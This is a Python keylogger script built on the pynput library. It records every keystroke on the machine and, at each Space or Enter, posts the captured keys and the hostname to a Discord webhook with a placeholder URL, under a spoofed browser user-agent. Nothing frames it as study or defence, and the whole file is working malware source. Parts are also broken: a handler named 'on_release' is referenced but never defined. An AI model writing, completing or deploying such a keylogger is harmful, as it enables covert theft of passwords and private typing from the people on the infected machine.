import json
from typing import KeysView
from urllib import request
from urllib.error import HTTPError
import socket

from pynput.keyboard import Key, Listener

keys = ''

def on_press(key):
    if key == Key.enter: key = "Enter"
    elif key == Key.space: key = "Space"
    elif key == Key.f1: key = "F1"
    elif key == Key.f2: key = "F2"
    elif key == Key.f3: key = "F3"
    elif key == Key.f4: key = "F4"
    elif key == Key.f5: key = "F5"
    elif key == Key.f6: key = "F6"
    elif key == Key.f7: key = "F7"
    elif key == Key.f8: key = "F8"
    elif key == Key.f9: key = "F9"
    elif key == Key.f10: key = "F10"
    elif key == Key.f11: key = "F11"
    elif key == Key.f12: key = "F12"
    elif key == Key.ctrl_l: key = "Ctrl[L]"
    elif key == Key.ctrl_r: key = "Ctrl[R]"
    elif key == Key.alt_gr: key = "Alt gr"
    elif key == Key.alt_l: key = "Alt"
    elif key == Key.alt_r: key = "Alt"
    elif key == Key.alt: key = "Alt"
    elif key == Key.tab: key = "Tab"
    elif key == Key.shift_l: key = "Shift"
    elif key == Key.shift_r: key = "Shift"
    elif key == Key.backspace: key = "<-"


    global keys
    if keys == '':
        keys = keys + str(key)
    else:
        keys = keys + ' | ' + str(key)

    if key == 'Space' or key == "Enter":

        WEBHOOK_URL = 'https://discord.com/api/webhooks/XXX/YYY'


        payload = {
            'content': '{0} >>> **Keys :** *||{1}||*'.format(socket.gethostname(), keys)
        }


        headers = {
            'Content-Type': 'application/json',
            'user-agent': 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
        }

        req = request.Request(url=WEBHOOK_URL,
                            data=json.dumps(payload).encode('utf-8'),
                            headers=headers,
                            method='POST')


        try:
            response = request.urlopen(req)
            print(response.status)
            print(response.reason)
            print(response.headers)
        except HTTPError as e:
            print('ERROR')
            print(e.reason)
            print(e.hdrs)
            print(e.file.read())
        keys = ''


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    keys = on_press(keys)
